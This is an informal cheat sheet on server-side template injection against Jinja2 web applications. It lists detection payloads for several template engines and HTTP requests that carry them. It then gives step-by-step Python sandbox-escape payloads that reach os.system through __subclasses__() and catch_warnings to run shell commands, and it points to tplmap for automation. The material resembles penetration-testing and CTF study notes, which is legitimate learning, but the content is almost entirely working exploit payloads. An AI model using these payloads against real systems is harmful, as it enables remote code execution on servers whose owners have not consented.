Template engine --> Jinja 2 engine
<html>
<body>
1 <h1>{{ list_title }}</h1>
<h2>{{ list_description }}</h2>
2 {% for item in item_list %}
{{ item }}
{% if not loop.last %},{% endif %}
{% endfor %}
</body>
</html>

Test by injecting payloads in input like {{1+1}}
and 
{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]

Some more...
${7*7}, {{7*7}}, and
<%= 7*7 %>

GET /display_name?name={{7*7}}
Host: example.com

Always try to run os.system('ls') command if vuln confirmed the same command could be different in different template engines according the 
programming language

GET /display_name?name="{{__import__('os').system('ls')}}"
Host: example.com

jinja2.exceptions.UndefinedError: '__import__' is undefined --> if u get error like this try
Python Sandbox escape
1) {{[].__class__.__bases__[0].__subclasses__()}}
when u submit this u will see methods like
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class
'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class
'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class
'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_
keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reverse
keyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitem
iterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class
'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class
'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memory
view'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class
'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_
or_method'>, <class 'method'>, <class 'function'>...]

Then run
{% for x in [].__class__.__bases__[0].__subclasses__() %}
2 {% if 'catch_warnings' in x.__name__ %}
3 {{x()}}
{%endif%}
{%endfor%}

{% for x in [].__class__.__bases__[0].__subclasses__() %}
{% if 'catch_warnings' in x.__name__ %}
{{x()._module.__builtins__}}
{%endif%}
{%endfor%

You should find import command in their
then execute
{% for x in [].__class__.__bases__[0].__subclasses__() %}
{% if 'catch_warnings' in x.__name__ %}
{{x()._module.__builtins__['__import__']('os').system('ls')}}
{%endif%}
{%endfor%}

Learn more for python sandbox escape --> https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/
python-sandbox-escape/ and https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes/

You can use tplmap to automate this task too




